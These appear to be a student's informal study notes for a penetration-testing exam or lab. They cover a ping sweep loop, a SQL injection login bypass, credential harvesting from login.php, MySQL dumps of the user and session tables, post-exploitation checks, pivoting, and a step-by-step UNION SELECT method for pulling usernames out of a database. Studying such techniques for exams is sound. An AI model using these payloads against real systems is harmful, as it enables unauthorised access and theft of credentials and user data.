read the mission plan.


```
target 1
```
take note of shell in /etc/passwd
```
ping sweep | proxychains if ping disabled , look at ttl
for i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
```

admin login, go to network tab
it will give post login.php
type what it says into the search bar, go back to network and go to request tab
its literally a .php api request
login.php?username=bob OR 1='1...

```
number of questions per on the exam:

postex: 11 **
winex: 5
recon: 4
sql: 4 **
linex: 4
binary: 4
exdev: 3
webex: 1
```
post ex, look in tmp /var/tmp /home/ , process list /etc/rsyslog* , 
'uname -a 4.15.0.213-generic'

ls /var/www/html
if in green. its a dir.

```
login.php has credentials to webuser,sqlpass
mysql --user=webuser --pass=sqlpass

show tables
select * from session_log;
select * from user;

exit
```
make your tunnel to it so you can jump to next box

if op plans say nothing about getting into the box, do not get into the box.

```
target 2
```
sql...

```
1=1 - > find vuln
UNION SELECT 1,2,3 - > find columns
// out put is 1,3,2
UNION SELECT table_name,column_name,table_schema from information_schema.columns - > golden rule
// information_schema is the database
you can change golden rule to read left to right with the output
// table_schema,column_name,table_name
Information_schema, MySQL, Performance_schema - > 3 default db but you do not have to query them outside of the golden rule !!!!
- > find user created db | also do not trip on product=7/the first line. ignore this along with the default db. !!!!
//example from dry run below.
UNION SELECT user_id,name,username from siteusers.users
```

